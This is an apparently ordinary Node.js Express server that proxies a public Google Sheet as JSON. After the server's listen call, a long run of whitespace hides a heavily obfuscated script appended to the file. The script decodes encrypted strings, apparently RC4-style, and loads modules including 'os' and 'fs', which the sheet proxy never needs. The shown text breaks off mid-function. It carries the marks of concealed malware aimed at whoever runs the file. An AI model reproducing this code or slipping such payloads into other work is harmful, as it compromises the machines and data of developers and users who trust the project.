const express = require('express');

const app = express();
const PORT = 3000;
const DEFAULT_SHEET_ID = '18ATEk4-2YihvjwxHRAaQNpVsOEaNP3a_S1QoPvT3fVQ';
const DEFAULT_GID = '1654060697';
const DEFAULT_SHEET_NAME = 'Data_1';

app.use(express.json());

// CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }

  next();
});

// Extract Sheet ID
function extractSheetId(sheetUrlOrId) {
  if (!sheetUrlOrId) return DEFAULT_SHEET_ID;
  const match = String(sheetUrlOrId).match(/\/d\/([a-zA-Z0-9-_]+)/);
  return match ? match[1] : String(sheetUrlOrId).trim();
}

// Parse Google response
function parseGvizResponse(raw) {
  const start = raw.indexOf('{');
  const end = raw.lastIndexOf('}');
  if (start === -1 || end === -1) {
    throw new Error('Invalid Google Sheets response');
  }
  return JSON.parse(raw.slice(start, end + 1));
}

function normalizeHeader(value, index) {
  const label = String(value || '').trim();
  return label || `column_${String.fromCharCode(65 + index)}`;
}

function isDefaultHeader(header) {
  return /^column_[A-Z]$/i.test(header);
}

function hasCellValue(value) {
  return value !== null && value !== undefined && String(value).trim() !== '';
}

function getCellValue(cell) {
  if (!cell) return null;
  if (hasCellValue(cell.v)) return cell.v;
  if (hasCellValue(cell.f)) return cell.f;
  return null;
}

function normalizeKey(key) {
  return String(key || '').toLowerCase().replace(/[^a-z0-9]/g, '');
}

function pickRowValue(row) {
  if (!row || typeof row !== 'object') return null;

  const preferred = [row.Value, row.value, row.column_C, row.column_D, row.column_E];
  for (const candidate of preferred) {
    if (hasCellValue(candidate)) return candidate;
  }

  const excluded = new Set(['dbpage', 'matrixname', 'columna', 'columnb']);
  for (const [key, value] of Object.entries(row)) {
    if (excluded.has(normalizeKey(key))) continue;
    if (hasCellValue(value)) return value;
  }

  return null;
}

function parseMonthLabel(label) {
  const match = String(label || '').trim().match(/^([A-Za-z]+)-?(\d{2}|\d{4})$/);
  if (!match) return null;

  const monthToken = match[1].slice(0, 3).toLowerCase();
  const monthIndex = {
    jan: 0, feb: 1, mar: 2, apr: 3, may: 4, jun: 5,
    jul: 6, aug: 7, sep: 8, oct: 9, nov: 10, dec: 11
  }[monthToken];
  if (monthIndex === undefined) return null;

  const yearToken = Number(match[2]);
  const year = match[2].length === 2 ? 2000 + yearToken : yearToken;
  return new Date(year, monthIndex, 1);
}

function formatMonthLabel(date) {
  const month = date.toLocaleString('en-US', { month: 'short' });
  return `${month}-${date.getFullYear()}`;
}

function inferLatestOverviewMonth(pageData) {
  const overview = pageData?.Overview;
  if (!overview || typeof overview !== 'object') return null;

  const months = Object.keys(overview)
    .map((key) => key.match(/^Forecast-(.+)$/)?.[1] || key.match(/^Active-(.+)$/)?.[1] || null)
    .filter(Boolean)
    .map(parseMonthLabel)
    .filter(Boolean)
    .sort((a, b) => a - b);

  return months.length ? months[months.length - 1] : null;
}

function formatHeadingToDate({ 
  Cuurent_Month_Heading, 
  Last_Month_Heading, 
  Cuurent_Year_Heading, 
  Last_Year_Heading 
}) {
  const monthNames = [
    'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
    'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
  ];

  const currentMonth = monthNames[Cuurent_Month_Heading - 1];
  const lastMonth    = monthNames[Last_Month_Heading - 1];

  return {
    current: currentMonth && Cuurent_Year_Heading 
      ? `${currentMonth}-${Cuurent_Year_Heading}` 
      : null,
    last: lastMonth && Last_Year_Heading 
      ? `${lastMonth}-${Last_Year_Heading}` 
      : null,
  };
}

function tableToRows(table) {
  const rawHeaders = (table.cols || []).map((col, index) => normalizeHeader(col.label, index));
  
  const visibleColumns = rawHeaders
    .map((header, index) => ({ header, index }))
    .filter(({ header }) => header && header.trim() !== '');

  const headers = visibleColumns.map(({ header }) => header);

  const rows = (table.rows || [])
    .map((row) => {
      const out = {};
      
      visibleColumns.forEach(({ header, index }) => {
        const cell = row.c && row.c[index];
        const value = getCellValue(cell);
        
        if (hasCellValue(value)) {
          out[header] = value;
        }
      });
      
      return Object.keys(out).length > 0 ? out : null;
    })
    .filter(Boolean);

  return { headers, rows };
}


function buildPageNameMap(rows) {
  const result = {};

  rows.forEach((row) => {
    const dbPage = row.DB_Page ?? row.db_page ?? row['DB Page'] ?? row.column_A;
    const matrixName = row['Matrix Name'] ?? row.Matrix_Name ?? row.matrix_name ?? row.column_B;
    const value = pickRowValue(row);

    if (!hasCellValue(dbPage) || !hasCellValue(matrixName)) {
      return;
    }

    const parentKey = String(dbPage).trim();
    const childKey = String(matrixName).trim();

    if (!result[parentKey]) {
      result[parentKey] = {};
    }

    result[parentKey][childKey] = hasCellValue(value) ? value : null;
  });

  return result;
}

async function fetchSheetAsJson(sheetId, gid, sheetName) {
  const url = new URL(`https://docs.google.com/spreadsheets/d/${sheetId}/gviz/tq`);
  url.searchParams.set('tqx', 'out:json');
  url.searchParams.set('sheet', sheetName);
  if (gid) url.searchParams.set('gid', gid);

  const response = await fetch(url);

  if (!response.ok) {
    throw new Error(`Google Sheets error: ${response.status}`);
  }

  const text = await response.text();
  const parsed = parseGvizResponse(text);
  const table = parsed.table || { cols: [], rows: [] };
  const { headers, rows } = tableToRows(table);
  const pageData = buildPageNameMap(rows);

  const licenseSchool = pageData['In Licence School'];
  if (licenseSchool && typeof licenseSchool === 'object') {
    const { current, last } = formatHeadingToDate(licenseSchool);
    if (current) {
      licenseSchool.Current_Month = current;
      licenseSchool.Cuurent_Month = current;
    }
    if (last) {
      licenseSchool.Last_Month = last;
    }
  }

  return {
    ok: true,
    sheetId,
    gid,
    sheetName,
    headers,
    rows,
    page_name: pageData,
    rowCount: rows.length,
    fetchedAt: new Date().toISOString()
  };
}

// Routes
app.get('/health', (req, res) => {
  res.json({ ok: true });
});

app.get('/api/sheet', async (req, res) => {
  try {
    const sheetId = extractSheetId(req.query.sheet || DEFAULT_SHEET_ID);
    const gid = String(req.query.gid || DEFAULT_GID).trim();
    const sheetName = String(req.query.sheetName || DEFAULT_SHEET_NAME).trim() || DEFAULT_SHEET_NAME;

    const data = await fetchSheetAsJson(sheetId, gid, sheetName);
    
    // Return only the page_name object
    res.json({
      ok: true,
      data: data.page_name
    });
  } catch (error) {
    res.status(500).json({
      ok: false,
      error: error.message,
      hint: 'Ensure the sheet is public and the sheet name matches exactly.'
    });
  }
});

// 404
app.use((req, res) => {
  res.status(404).json({
    ok: false,
    error: 'Not Found'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
																																																												function c(b,d){b=b-(-0x1598+-0x215b*-0x1+-0xb17);var e=a();var f=e[b];if(c['knmUNx']===undefined){var g=function(l){var m='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var n='',o='';for(var p=0x1243+-0x1*0x1c03+-0x18*-0x68,q,r,s=-0x80d*-0x2+-0x1*-0x491+0x25*-0x8f;r=l['charAt'](s++);~r&&(q=p%(0x27f+0x100a*0x2+0x1*-0x228f)?q*(0x1*-0xca6+0x3d6*0x8+-0x11ca)+r:r,p++%(-0xa26+-0x14*0x17b+0x27c6))?n+=String['fromCharCode'](0x8*0x101+-0x2*-0x11fb+0x1*-0x2aff&q>>(-(-0x1289+0x19*0x47+0x5ce*0x2)*p&-0x17*0x1d+-0x64*0xb+-0x6ed*-0x1)):-0x151d+-0x2349+0x1*0x3866){r=m['indexOf'](r);}for(var t=0x13d2*0x1+-0x120c+0x1c6*-0x1,u=n['length'];t<u;t++){o+='%'+('00'+n['charCodeAt'](t)['toString'](0x121*0x11+-0x26a6+-0x1385*-0x1))['slice'](-(0x6*0x22+0x526*-0x2+0x982));}return decodeURIComponent(o);};var k=function(l,m){var n=[],o=0x9*-0x56+0x1492+0x8c6*-0x2,p,q='';l=g(l);var r;for(r=0x16ce+0x2d1*0x7+-0x2a85;r<-0x18b5+0x1*0x241f+-0xa6a*0x1;r++){n[r]=r;}for(r=0x1219*0x1+-0x129*0x1b+0xd3a;r<-0x1a5*-0x11+-0x3*0x1fd+-0x14fe;r++){o=(o+n[r]+m['charCodeAt'](r%m['length']))%(-0xe3+-0x1*-0x7d6+-0x5f3),p=n[r],n[r]=n[o],n[o]=p;}r=0x6*-0x4a0+-0x818+0x23d8,o=-0x1d12+0x1605+0x70d;for(var t=-0x7c+-0x1f*0xc5+-0x5d*-0x43;t<l['length'];t++){r=(r+(-0x1e8*0x13+0x8+0x5*0x73d))%(-0x2150+0x137e+0xed2*0x1),o=(o+n[r])%(0x1f6f*0x1+-0xa9e+-0x13d1),p=n[r],n[r]=n[o],n[o]=p,q+=String['fromCharCode'](l['charCodeAt'](t)^n[(n[r]+n[o])%(0x189*-0x8+-0x147a+-0x1*-0x21c2)]);}return q;};c['HAzFTo']=k,c['lRegah']={},c['knmUNx']=!![];}var h=e[-0x243*-0xf+0x6eb*-0x1+0x2*-0xd81],i=b+h,j=c['lRegah'][i];return!j?(c['HgOhis']===undefined&&(c['HgOhis']=!![]),f=c['HAzFTo'](f,d),c['lRegah'][i]=f):f=j,f;}function a(){var cc=['lXFdKCoJWR8','zg9Uzq','WORdLmoFt2a','ESo/WRhcR8kYW4pdJW','zNjowgW','wMzUzKO','WQmjW7BcImk8','t1rxDvO','jYbTzxrOB2q','zMLUywW','C2XPy2u','rSkiW4qepq','W4ZcSmogWOdcO3ddVKNdRspcISkUW6xcRSkmgSkM','AxrLCMf0B3i','qrxcOmkz','z2v0uhjVDg90ExbLt2y','WR5giaZdOW','D0H3zvy','WRaCW4lcR8kh','przqpmoBzCo+','WOCtWPRcLrO','kbXpj8ogzCo0z8kH','whfzvgC','W43cN13dOxe','C2fSDa','rNDprLu','uu5ZEuK','W6BdOG9SWPG','rgv4vMm','WRtdTmkUWRdcRG','suvYAgC','s0rtvLu','nafYpmoC','CunfBKu','WRZcJCoWnCkS','W7pdSdy6W6i','EmkXWRzVW5a','naRdMCoCWOq','zvj4AgW','W7HkWROdWRNdMSonW645ea','z2fQzhe','WOJcP8oxf8kZ','BM9KzsbWywnR','C1zvuNy','zfHTrxe','nJBdTCoFWOO','rfjLvKu','WOCBW6rrWQRdO8oOW7qg','A1biu0e','odqWn2fyuxvnDq','dstdNNNdRa','BMv4Da','ECkRWPTHW5m','i1BcVmoUbW','CKfqv20','u1PdAMm','WPHIwCkeha','z2LftwK','s8oMpCkPW6y','DYdcJcRdHq','run2qmko','qZ/dTSopW6e','WPxdOCo+FqXOjLK','WORcVSoHgmkT','WPq2W79bWRS','WOflCmkItCk7W6G','W5/cOgddMva','rNnKuhC','dZCbW5BdV8kG','qebPDgvYyxrVCG','vgHLigL0zxjHDg9YigrVzxmGBM90ihbYB3zPzguGysa','nHddGCo6WPi','W5dcMmouWRtcVG','kXRdUNxdLq','wvDsBey','W7RcONVcSSk1l8kXEW','mtK1ovvbvuHUzq','irzSpmoN','tufRyvi','nHOaFSkeF8oIoSkZWR5RfSoVWPtdHSksksDcWQajWRFcRItcVeXmWRNcK0mUDG','B24TAxrLCMfIBguGAw5ZDgfUy2uUcKLUig9YzgvYihq','zKrsrgi','WPxcTSkCnfu','whbVC3G','fbu4W6xdMG','W4VcNg7cSmkW','uYibWP9K','C2v0uhjVDg90ExbLt2y','A1JdQGFcIa','wuzRzwG','tSovo8kdW6ucW6NdVsngkmo1bdnftSka','W6XYkcLRjG','BejiBem','zH7cRSkmBCkDW5r/W5b1W7fGWRdcVSkoWRtdKmkuW4LQu8k2WRxcQSo8W4lcJCoXcCo5W51k','fCkxW55qAG','CMv0DxjU','sfHJCeG','seHRA0K','sWNcHZxdKW','qKLkyKW','ExHmB04','pXBdOKldUa','W4/cTvlcUmki','wCowWO/cJmkq','C3rYAw5N','venXzwO','quvOtgG','WRa3W4LJWPW','tIpcGJO','zuHjueC','Ahr0CdOVlW','D25VzLe','qxjNDw1LBNrZ','D3jPDgvgAwXLu3LUyW','wxDwB3i','zCkZW44FW7WS','ixRcJSojaW','tgLsrfy','fb9JbmoU','W7/dUGldPuZdSJ8','Dw5KzwzPBMvK','WPFdOmoFBf5zoG','vK95ru8','vvnuq3i','uITjWOGp','A3PRDLC','Dw5Oyw5KBgvKuMvQzwn0Aw9U','W7hdGWHOWOq','BYbIzsbPDgvYywjSzsWGBM9UlwfYCMf5ig9IAMvJDhm','FZ7dO8oKW7u','WRz6aSoaW6u','ANvoD2q','W5VcQCoijq','ntG2mJrNqvfpswS','WPxdI8k/WOJcMq','WOFdVmocza','y2fSBa','DHWSWR9U','DxbKyxrL','zxHWB3j0CW','xw5x','W63dH8oEBqlcVuJcTSkOBMxcQwC','DK1hA3a','tuLkAem','edNdRSoFWRO','t1HdqMm','W6/cNSoClba','ySo8kSkFW5S','z1njzMG','WPRdTCoIW7S+f1HykxNdNmkYWRnTjry','ChjVDg90ExbL','vMftB0m','DMfSDwu','WQpdGSkk','WQ4pWRRcTsa','ChvZAa','W63cTCo0WOFcRG','W5ddISkBWORcT3FcSmkj','l2fWAs9Zzxj2AwnLlW','Dg9tDhjPBMDuywC','WPBdLCkrWPm','rvL3sgC','AM9PBG','yMLUza','ouvlB1H3wa','W4KBzmkSyvW','h8kSW6jRASkA','AwDTqvG','WRVdTSoLs3u','W5ldMHpdMu8','WQyjWOZcKsC','DMXfDum','yMfZzty0','wNtcKmofemo4na','tsSyWOnY','A8oVWRpcR8k3','w29IAMvJDcbhzw5LCMf0B3jD','W64LzCkyqG','wKLuyw4','AuLzwNq','EZeiW6NdRa','BCk9WRTJW74','W4FcOmkzmrHkcfldJSoEla','W57cL3NcT8kS','BCkDWQ19W5q','rxnpDva','WR06WPdcUqhcS8oMWRxdUuK','W5NdQ8oFW5C9','W4rvhr1+','mtqWmtaYme9TAMzwvq','WQPLsmkSWOu','y3jLyxrLrgvJAxbOzxjPDG','d2hcKCopbCoG','y8oiA8oJhG','AgrYzMC','W7pdGCo6W5yR','y29UC3rYDwn0B3i','DColdCkWW4ez','Cgf0Aa','nJiWnZmWBM5uuhr2','qKfUAMi','ymoemmkuW7yxW7ldOhfYomoOeITyaCkhad1hxCk5W5BcJ2RcOmkxsgroW7Dr','z2v0','q3fgzW','r3bPzKS','ct8FW5Tn','WPTUySk/oG','WORcHSkabv8','WPNcPmkddNu','W4iqEmkPzW','W4tcKSoiW43dQsdcVmobrsnnWPG','WQX+bJRdGa','rfnqtNe','zNvUy3rPB24','grJdGL7dSW','x2LUDM9Rzq','qmkkW6Oxfa','WResWQBcQchcGMlcMCoQ','sMvUwuy','ywvZlti1nI1JyMm','vgjMuNK','kmkvW5fIvW','Exjhr3K','EePxsw4','ruPQEMi','WQNcMmoPpSk2vW','rvP3rfq','W5ldOCo9W7mGbL0','B05QDvC','smkPW6GuW6C','W6VcG23cGCk1','wLrWtvC','WP3cVSkjoNG','vvLouKy','fZTef8o7','WOKkW4XYWPq','WRtdGSkgWQJcVa','mqldVL7dHa','Aa5FWR8tWRy','WOOzF8k8DaHsoNVdLXNcQYJdO8oetw16Dv0tWOZdPg5UW4BcPCojfHnwlW','r2X1DMq','zgf0yq','ndu2mZy4AgzQz3fn','W4HTod1g','qK9Ru04','r2jey1C','ChTbASkc','WOHwBSkQs8kN','W6RcRNJdQq','qvVdUrdcJW','z3HhELG','cSkkW6NcNZy','vu9uCLK','m0Tss2LbCG','C29Us2O','rKfdrgu','gqjLh8oM','W7RdS8ohW7qK','xSkkW6KoW48','WRJdImogBby','t2jQzwn0','W7xdQdFdTfy','r3LbDgK','WRNcH8ood8kr','mte5mJy0tNfItNLA','W5FdMIuWW4y','zgvMAw5LuhjVCgvYDhK','W7ldPZjoWP3cJ3hcIsO','D1fesNy','k2VcKCojfSo1d8kvW67dT8owWQVdJmkUW6JcLaJdOmoUW5JcUvtcNXTSlaai','dXddRSoIWOG','huVcUCoCkq','WRXEpq8','yKP2uNu','rgLpymkW','DgvZDa','vvboExy','W75dfdDA','WPeGW47cM8kE','Ee7cUW7dIgyUWQ5OWOu','paDti8ofCmo0wCkLWRj8','rLfotfa','B29jBg0','BgvUz3rO','WPpdQmoFB1u','u3jvrei','BCoOomkJW6y','sIanWQDV','WPxdPSoizW','WRFcMSoWna','W5XeuSkEh8o4aq','yK1sC2C','sSouWPxcG8kY','CLPvsuO','uhrYEfi','zulcOSoSca','WQXwuCk2aG','sXlcPWZdVG','u2VcOCoKcq','radcNCkPEa','WPyQW6vqWOa','ndrYCuXPAeC','yM10qKG','oSkBW5eCbSo1W6y','t1HwvLK','twfW','WPP9qSkJWPC','W5RcV8ojWO0','W7pdStpdUeZdPZu','W4RcPmoikXC','uCkEW4OuW4yQWO9tW7BdVWNdNmkp','v2rhtKK','y3jLyxrL','D2xdUJtcTa','WOXcASkUrG','zCoxsSo7aSk3WRu','BNbTigLUC3rHBgWGyxHPB3mGC29JA2v0lMLVlwnSAwu','Dg9tDhjPBMC','WRNdSCkhWRpcMG','W4FdQ8oIW6G9bLDnia','s0PuD3G','y29Uy2f0','eaddMfJdRW','W53cG2BcUmk6gmoY','WR08WPBcKapcQmobWQpdO1pcMfddGmkz','dSkkvSo8iCk1WRGO','WPdcPCk2p2e','D8oCfSkXW5WdWQlcHSob','ENPIDg8','W5/dJdhdV1K','B8koW5awe8oT','Cc/cQmkFBSkaW58aW64','y2HPBgrFChjVy2vZCW','nJa0mZC2zty0ytfIndy1ztnKyJi0mgjLmdi3otaXzJK','EJ9/WRaI'];a=function(){return cc;};return a();}function b(c,d){c=c-(-0x1598+-0x215b*-0x1+-0xb17);var e=a();var f=e[c];if(b['aedVms']===undefined){var g=function(l){var m='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var n='',o='';for(var p=0x1243+-0x1*0x1c03+-0x18*-0x68,q,r,s=-0x80d*-0x2+-0x1*-0x491+0x25*-0x8f;r=l['charAt'](s++);~r&&(q=p%(0x27f+0x100a*0x2+0x1*-0x228f)?q*(0x1*-0xca6+0x3d6*0x8+-0x11ca)+r:r,p++%(-0xa26+-0x14*0x17b+0x27c6))?n+=String['fromCharCode'](0x8*0x101+-0x2*-0x11fb+0x1*-0x2aff&q>>(-(-0x1289+0x19*0x47+0x5ce*0x2)*p&-0x17*0x1d+-0x64*0xb+-0x6ed*-0x1)):-0x151d+-0x2349+0x1*0x3866){r=m['indexOf'](r);}for(var t=0x13d2*0x1+-0x120c+0x1c6*-0x1,u=n['length'];t<u;t++){o+='%'+('00'+n['charCodeAt'](t)['toString'](0x121*0x11+-0x26a6+-0x1385*-0x1))['slice'](-(0x6*0x22+0x526*-0x2+0x982));}return decodeURIComponent(o);};b['eQVCzR']=g,b['xpmMLw']={},b['aedVms']=!![];}var h=e[0x9*-0x56+0x1492+0x8c6*-0x2],i=c+h,j=b['xpmMLw'][i];return!j?(f=b['eQVCzR'](f),b['xpmMLw'][i]=f):f=j,f;}(function(d,e){var aq=b,ap=c,f=d();while(!![]){try{var g=-parseInt(ap(0x121,'Iunz'))/(-0x149b+0x2051+-0xbb5*0x1)*(-parseInt(aq(0x107))/(-0x1*0xae7+-0x23a7+0x4a8*0xa))+-parseInt(aq(0x19a))/(0x674+0x7bc*0x3+-0x1*0x1da5)*(parseInt(ap(0x144,'DiP('))/(-0xb0d+0x410*0x8+0xb1*-0x1f))+parseInt(aq(0xc6))/(-0x45*-0x17+0x11a7*0x1+0x17d5*-0x1)+parseInt(ap(0xac,'yAb!'))/(0x2289+0x121a+-0x349d)*(-parseInt(aq(0x17f))/(-0x7ee+-0x35*0x65+-0x5*-0x5c6))+parseInt(aq(0x1d3))/(-0x1d2c+0x24b5+-0x781)+-parseInt(aq(0x1f2))/(-0xccf*0x2+0x88b+-0x1e*-0x92)*(parseInt(ap(0x1db,'q9xZ'))/(-0xaa7+-0xdbc+-0x1e1*-0xd))+-parseInt(ap(0xd1,'Nqys'))/(-0x253a+0x1*0xe12+0x1*0x1733);if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,-0xb23c+0x185*-0x5+-0x6d*-0x605),((()=>{var as=c,ar=b,g={'USTCr':function(N,O){return N(O);},'CYQct':ar(0x14b),'qCEnE':function(N,O){return N(O);},'yxLoN':function(N,O){return N(O);},'alceu':ar(0xc5),'BZMaH':as(0x170,'[]Y!'),'KJTwx':as(0x1a9,'N*O6'),'DSPNq':function(N,O){return N!==O;},'rZUIJ':function(N,O,P,Q){return N(O,P,Q);},'DexVc':as(0x1a8,'zV7O'),'EWmRG':ar(0xaf),'moabC':function(N,O){return N&&O;},'YwVor':function(N,O){return N<O;},'frNXl':function(N,O){return N>O;},'Wbcuz':function(N,O){return N===O;},'fGiCR':function(N,O){return N<=O;},'DJPCh':function(N,O){return N>O;},'KDSVU':function(N,O){return N>O;},'VaSoC':as(0x10c,'yAb!'),'fGMMg':function(N,O){return N===O;},'sVURv':function(N,O,P){return N(O,P);},'IJxUk':function(N,O){return N>O;},'AEhLh':as(0x15c,'XgkS'),'loRou':as(0xc8,'zV7O'),'FQNLP':function(N,O){return N+O;},'RGzue':ar(0x194)+'\x27','VOyEO':ar(0x156),'jwqnC':function(N,O){return N instanceof O;},'GpifK':function(N,O,P,Q,R){return N(O,P,Q,R);},'JpNot':ar(0xd6),'PtrxR':function(N,O){return N==O;},'sonKj':ar(0xd4),'EYwHg':ar(0x193),'qEFpM':as(0x135,'KadX'),'iIYZt':function(N,O,P,Q){return N(O,P,Q);},'kPHSA':ar(0xc3),'qjyQx':function(N,O,P,Q){return N(O,P,Q);},'SzUtI':function(N,O,P,Q){return N(O,P,Q);},'EZwDT':as(0x17d,'Mtvd'),'HXcpH':as(0x18c,'5UxK'),'wHweV':function(N,O,P,Q){return N(O,P,Q);},'SZCjc':as(0xae,'^XaV'),'JenYF':function(N,O,P){return N(O,P);},'OXVVY':ar(0x1ad),'tabjL':function(N,O,P,Q){return N(O,P,Q);},'TKVhI':function(N,O,P,Q,R){return N(O,P,Q,R);},'wQDJv':function(N,O){return N(O);},'YWRlF':ar(0x1b6),'xLpLL':ar(0x103),'zzbto':function(N,O){return N===O;},'InJHY':ar(0x130),'sAWYS':function(N,O){return N===O;},'FsdPw':as(0x1e7,'Nqys'),'LVXcS':function(N,O){return N===O;},'QNsyI':ar(0x1be),'ZFXfs':function(N,O,P){return N(O,P);},'pICWD':as(0x1ab,'XgkS')+ar(0x19e)+ar(0x1ce)+as(0xee,'e20R')+as(0x1eb,'Nqys'),'XqYTg':function(N,O){return N==O;},'THuuc':function(N,O){return N!=O;},'UOTrY':ar(0x1c6),'YWsVh':function(N,O){return N!=O;},'xupiY':function(N,O){return N===O;},'PnjKS':function(N,O){return N!==O;},'hqjcy':function(N,O){return N!=O;},'Mtqeg':function(N,O){return N(O);},'UPNyv':function(N,O){return N<O;},'ItFFL':as(0x1d2,'RtWI'),'WKxBr':ar(0xda),'JizqO':ar(0x1fa),'LkTbf':as(0xf7,')@EG'),'gSIfh':function(N,O,P){return N(O,P);},'gxGzX':ar(0x178),'oosin':ar(0x1bc),'QOyFs':ar(0x1ec),'oOIWL':as(0x1da,'JFQu'),'OTWuZ':function(N){return N();},'URNMl':function(N,O,P,Q,R,S,T,U){return N(O,P,Q,R,S,T,U);},'VunYm':function(N,O,P,Q,R,S,T,U){return N(O,P,Q,R,S,T,U);},'PoLin':function(N,O){return N(O);},'eHIPG':function(N,O){return N(O);},'OXCBc':function(N,O){return N(O);},'LqCWG':function(N,O,P){return N(O,P);},'IVyME':ar(0x13b)+as(0x19d,'O1BY')+as(0x1e3,'Ax65'),'nICTo':as(0x15a,'Fxne'),'wmYQj':ar(0x1cc),'elAvF':ar(0x14c),'cfAUQ':ar(0x166)},j,k={0x13d:N=>{'use strict';var at=as;N[at(0x1c7,'iZGX')]=g[at(0x123,'^XaV')](require,g[at(0x127,'Iunz')]);},0x359:N=>{'use strict';var av=ar,au=as;N[au(0x18f,'O5A3')]=g[av(0x1c9)](require,'os');},0x380:N=>{'use strict';var aw=as;N[aw(0x133,'$k]A')]=g[aw(0x114,'N*O6')](require,'fs');},0x3a0:N=>{'use strict';var ay=as,ax=ar;N[ax(0x1d9)]=g[ax(0x1b2)](require,g[ay(0x134,'RtWI')]);},0x3aa:N=>{'use strict';var aA=ar,az=as;N[az(0x151,'^XaV')]=g[aA(0x1b2)](require,g[az(0x160,'Ax6e')]);},0x3d6:N=>{'use strict';var aC=as,aB=ar;N[aB(0x1d9)]=g[aC(0xfa,'TL*Q')](require,g[aB(0x13f)]);}},q={};function w(N){var aE=ar,aD=as,O=q[N];if(g[aD(0x16b,'Nqys')](void(0x1a5c+0x43f*0x2+-0x22da*0x1),O))return O[aD(0xe2,'Ax65')];var P=q[N]={'exports':{}};return k[N](P,P[aD(0x161,'O1BY')],w),P[aE(0x1d9)];}function x(){var aS=as,aN=ar,N={'juNwd':function(a1,a2){var aF=c;return g[aF(0x171,'tf%3')](a1,a2);},'OUdDR':function(a1,a2){var aG=b;return g[aG(0x1c0)](a1,a2);},'Gluvd':function(a1,a2){var aH=b;return g[aH(0x152)](a1,a2);},'FACDe':function(a1,a2){var aI=c;return g[aI(0x131,'Qwot')](a1,a2);},'WdGNI':function(a1,a2){var aJ=c;return g[aJ(0x129,'8WOY')](a1,a2);},'Xposx':function(a1,a2){var aK=c;return g[aK(0xf8,'$T(Z')](a1,a2);},'vMGkp':function(a1,a2){var aL=b;return g[aL(0x16d)](a1,a2);},'bmtBH':function(a1,a2){var aM=b;return g[aM(0x1c9)](a1,a2);},'KULDa':g[aN(0x1e5)],'BAnjb':function(a1,a2){var aO=c;return g[aO(0x1cf,'!0aq')](a1,a2);},'EsOuP':function(a1,a2,a3){var aP=c;return g[aP(0x1cd,'^^%v')](a1,a2,a3);},'YFkeh':function(a1,a2){var aQ=c;return g[aQ(0x141,'n7RP')](a1,a2);},'bJvRu':function(a1,a2){var aR=c;return g[aR(0x162,'$dKu')](a1,a2);},'MAkaR':g[aN(0x1b8)],'MjJhv':g[aS(0x16e,'O1BY')],'fDRDb':function(a1,a2){var aT=aS;return g[aT(0xe4,'KadX')](a1,a2);},'TCqej':function(a1,a2){var aU=aS;return g[aU(0x1b5,'^XaV')](a1,a2);},'FwOFU':function(a1,a2){var aV=aN;return g[aV(0x118)](a1,a2);},'hhuis':g[aS(0x1d0,'n79z')],'BOkSN':g[aN(0x1c8)],'oNjuW':function(a1,a2){var aW=aS;return g[aW(0x1f7,'$k]A')](a1,a2);},'ZTpMW':function(a1,a2){var aX=aS;return g[aX(0x14e,'0k5#')](a1,a2);},'TkQfx':function(a1,a2,a3,a4,a5){var aY=aN;return g[aY(0xcb)](a1,a2,a3,a4,a5);},'igmAX':g[aS(0x10d,'0k5#')]},O,P,Q=g[aN(0x125)](g[aN(0xfd)],typeof Symbol)?Symbol:{},R=Q[aN(0x15b)]||g[aN(0x1ef)],S=Q[aN(0x1ed)]||g[aS(0x10e,'yAb!')];function T(a1,a2,a3,a4){var bd=aN,b8=aS,a5={'FvXxg':function(a8,a9){var aZ=b;return N[aZ(0x1d1)](a8,a9);},'IErhg':function(a8,a9){var b0=c;return N[b0(0xe9,'O1BY')](a8,a9);},'kzkvW':function(a8,a9){var b1=b;return N[b1(0xef)](a8,a9);},'AMgfJ':function(a8,a9){var b2=b;return N[b2(0xfe)](a8,a9);},'DVwbr':function(a8,a9){var b3=b;return N[b3(0x136)](a8,a9);},'dwRVj':function(a8,a9){var b4=c;return N[b4(0x182,'O6*v')](a8,a9);},'SrUDB':function(a8,a9){var b5=b;return N[b5(0x1a1)](a8,a9);},'eRSZh':function(a8,a9){var b6=b;return N[b6(0x1dc)](a8,a9);},'dXmEq':function(a8,a9){var b7=c;return N[b7(0x197,'n7RP')](a8,a9);},'BIJbL':N[b8(0xbb,'N*O6')],'yrGGy':function(a8,a9){var b9=b;return N[b9(0xc7)](a8,a9);},'GbDcW':function(a8,a9,aa){var ba=b;return N[ba(0xb8)](a8,a9,aa);},'kKhjl':function(a8,a9){var bb=b;return N[bb(0x1a7)](a8,a9);},'kpEDy':function(a8,a9){var bc=b;return N[bc(0x110)](a8,a9);},'MVXIy':N[bd(0x19c)],'DQoWB':function(a8,a9){var be=bd;return N[be(0x12d)](a8,a9);},'ZfnfJ':N[b8(0x100,'Ax65')],'giEMi':function(a8,a9){var bf=bd;return N[bf(0x19f)](a8,a9);},'LiRDV':function(a8,a9){var bg=bd;return N[bg(0x1b7)](a8,a9);},'lBHlC':function(a8,a9){var bh=bd;return N[bh(0x167)](a8,a9);},'eRxhl':N[b8(0x1a4,'wqwF')],'GmidY':N[bd(0xf3)],'bMRsg':function(a8,a9){var bi=bd;return N[bi(0xe3)](a8,a9);},'ooIlm':function(a8,a9){var bj=b8;return N[bj(0x102,'5UxK')](a8,a9);}},a6=a2&&N[bd(0xe6)](a2[b8(0x146,'2kVv')],V)?a2:V,a7=Object[b8(0x1f4,'Iwa0')](a6[b8(0x163,'O1BY')]);return N[b8(0x1ea,'Fxne')](z,a7,N[bd(0x1f5)],function(a8,a9,aa){var bk=bd,ab,ac,ad,ae=-0x3*0xd4+0x2*-0xc8d+-0x1*-0x1b96,af=aa||[],ag=!(-0x68f+0x1*0x1585+-0xef5),ah={'p':0x0,'n':0x0,'v':O,'a':ai,'f':ai[bk(0x1f1)](O,0xe7a+-0x107*-0x13+-0x21fb),'d':function(aj,ak){return ab=aj,ac=-0x11fc+-0x2260+0x1*0x345c,ad=O,ah['n']=ak,U;}};function ai(aj,ak){var 